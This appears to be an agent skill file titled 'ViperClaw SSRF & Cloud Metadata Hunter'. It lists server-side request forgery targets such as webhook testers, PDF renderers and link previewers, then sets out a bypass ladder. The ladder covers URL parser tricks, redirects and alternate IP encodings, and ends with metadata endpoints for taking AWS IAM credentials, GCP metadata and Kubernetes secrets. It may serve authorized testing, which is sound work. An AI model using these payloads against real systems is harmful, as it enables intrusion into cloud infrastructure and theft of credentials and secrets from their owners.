---
name: viper-ssrf-cloud
description: Server-Side Request Forgery (SSRF) & Cloud Metadata Exploitation Skill. Covers URL parser differentials, redirect chains, IMDSv1/IMDSv2, Kubernetes service discovery, and OOB confirmation.
---

# ViperClaw SSRF & Cloud Metadata Hunter (`viper-ssrf-cloud`)

## High-Probability SSRF Sinks
1. **Webhook & Integration Testers:** Slack/Discord/Stripe webhook test endpoints (`POST /api/webhooks/test`).
2. **Document / PDF / Image Renderers:** HTML-to-PDF (`wkhtmltopdf`, Headless Chrome), SVG imports, avatar URL fetchers (`?image_url=`).
3. **Proxy & Link Previewers:** OpenGraph unfurlers, `/api/proxy?url=`, RSS/XML feed importers.

## Bypass & Escalation Ladder
1. **Baseline OOB Proof:** Point target parameter at an out-of-band listener to capture the backend HTTP client's `User-Agent` (`python-requests`, `Go-http-client`, `axios`, `curl`) and source IP.
2. **Allowlist & URL Parser Differentials:**
   - `https://expected-domain.com@169.254.169.254/`
   - HTTP `302 Found` redirect from an attacker-controlled HTTPS domain to internal targets (`http://169.254.169.254/latest/meta-data/`, `http://127.0.0.1:6379/`).
   - Alternate IP encodings (`http://2852039166/`, `http://[::ffff:169.254.169.254]/`, DNS rebinding / `nip.io`).
3. **Cloud & Internal Escalation:**
   - **AWS:** `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
   - **GCP:** `http://metadata.google.internal/computeMetadata/v1/?recursive=true` (with `Metadata-Flavor: Google` if header injection is possible)
   - **Kubernetes:** `https://kubernetes.default.svc/api/v1/namespaces/default/secrets`
